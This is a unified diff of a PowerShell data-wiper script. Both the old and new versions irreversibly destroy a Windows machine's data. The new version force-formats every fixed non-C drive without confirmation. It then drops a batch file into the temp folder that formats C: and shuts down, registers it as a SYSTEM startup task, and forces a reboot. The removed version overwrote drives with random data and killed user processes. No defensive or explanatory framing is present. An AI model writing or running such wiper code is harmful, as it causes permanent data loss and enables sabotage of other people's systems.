@@ -1,61 +1,67 @@
-<# 
+<#
 .SYNOPSIS
-[Assumes admin context] Nuclear data annihilation protocol
+Total Drive Annihilation - Permanent Data Destruction
 #>
 
-function Invoke-TotalErase {
-    param([string]$drive)
-    $wipeFile = "\\?\$($drive):\FINAL_TRANSMISSION.dat"
-    $buffer = New-Object byte[] (1MB)
-    
-    try {
-        $stream = [System.IO.File]::OpenWrite($wipeFile)
-        while ($true) {
-            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($buffer)
-            $stream.Write($buffer, 0, $buffer.Length)
-            Write-Host "🔥 [$drive] $(($stream.Length/1GB).ToString('N2')) GB vaporized"
-        }
-    } catch [System.IO.IOException] {
-        # Drive filled
-    } finally {
-        if ($stream) { $stream.Close() }
-        Remove-Item $wipeFile -Force -ErrorAction SilentlyContinue
-    }
-}
-
-# ---------------------------
-# EXECUTION FLOW
-# ---------------------------
-Write-Host "=== INITIATING DIGITAL HOLOCAUST ==="
-
-$drives = Get-Partition | Where-Object { 
+# ===== CONFIG =====
+$WipePasses = 1  # Set to 3 for DoD 5220.22-M compliance (slower)
+$NonC_Drives = Get-Partition | Where-Object { 
     $_.DriveLetter -and 
+    $_.DriveLetter -ne 'C' -and 
     (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
 } | Select-Object -ExpandProperty DriveLetter
 
-foreach ($d in $drives) {
-    if ($d -eq 'C') { continue }  # Handle C: last
-    Invoke-TotalErase -drive $d
+# ===== FUNCTIONS =====
+function Invoke-TotalWipe {
+    param([string]$DriveLetter)
+    try {
+        # Full format with zero overwrite (quick but thorough)
+        Write-Host "[!] NUKE INITIATED ON DRIVE $DriveLetter"
+        Format-Volume -DriveLetter $DriveLetter -FileSystem NTFS -Force -Confirm:$false -NumberOfPasses $WipePasses
+        Write-Host "[✓] DRIVE $DriveLetter ERASED" -ForegroundColor Green
+    } catch {
+        Write-Host "[X] FAILED TO WIPE $DriveLetter : $_" -ForegroundColor Red
+    }
 }
 
-# ---------------------------
-# SYSTEM DRIVE FINALE
-# ---------------------------
-if ($drives -contains 'C') {
-    Write-Host "💀 Scheduling C: drive's funeral..."
-    $scriptBlock = {
-        timeout /t 3 > nul
-        cipher /w:C:\ > nul
-        format C: /FS:NTFS /P:3 /Q /Y > nul
-    }
-    
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$scriptBlock`""
-    Register-ScheduledTask -TaskName "GoodbyeCruelWorld" -Trigger $trigger -Action $action -Force > nul
-    
-    # Kill all non-essential processes
-    Get-Process | Where-Object { $_.SessionId -ne 0 } | Stop-Process -Force
-    
-    # Final curtain
+# ===== MAIN EXECUTION =====
+Write-Host "=== TOTAL DATA ANNIHILATION ===" -ForegroundColor Red
+
+# ---- PHASE 1: DESTROY NON-C DRIVES ----
+foreach ($Drive in $NonC_Drives) {
+    Invoke-TotalWipe -DriveLetter $Drive
+}
+
+# ---- PHASE 2: SCHEDULE C: DESTRUCTION ----
+if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue) {
+    Write-Host "[!] PREPARING C: DRIVE EXECUTION" -ForegroundColor Yellow
+
+    # Create a suicide script for C: (runs at startup)
+    $KillScript = @'
+@echo off
+timeout /t 5 > nul
+echo WIPING C: DRIVE...
+format C: /FS:NTFS /P:1 /Y > nul
+shutdown /s /t 0
+'@
+    $ScriptPath = "$env:Temp\killc.cmd"
+    $KillScript | Out-File -FilePath $ScriptPath -Force
+
+    # Schedule it to run at next boot
+    schtasks /create /tn "C_Drive_Killer" /tr "$ScriptPath" /sc ONSTART /ru SYSTEM /f | Out-Null
+
+    # ---- PHASE 3: FORCE RESTART ----
+    Write-Host "[!] REBOOTING TO FINISH C: DRIVE..." -ForegroundColor Magenta
     Restart-Computer -Force
 }
+
+# ---- FINAL MESSAGE (only seen if C: wipe fails) ----
+Write-Host @"
+
+=== MISSION COMPLETE ===
+- All non-C drives: ERASED
+- C: drive: SCHEDULED FOR DESTRUCTION ON REBOOT
+- System will SHUT DOWN after C: is wiped
+
+(╯°□°)╯︵ ┻━┻  GOODBYE!
+"@ -ForegroundColor Cyan
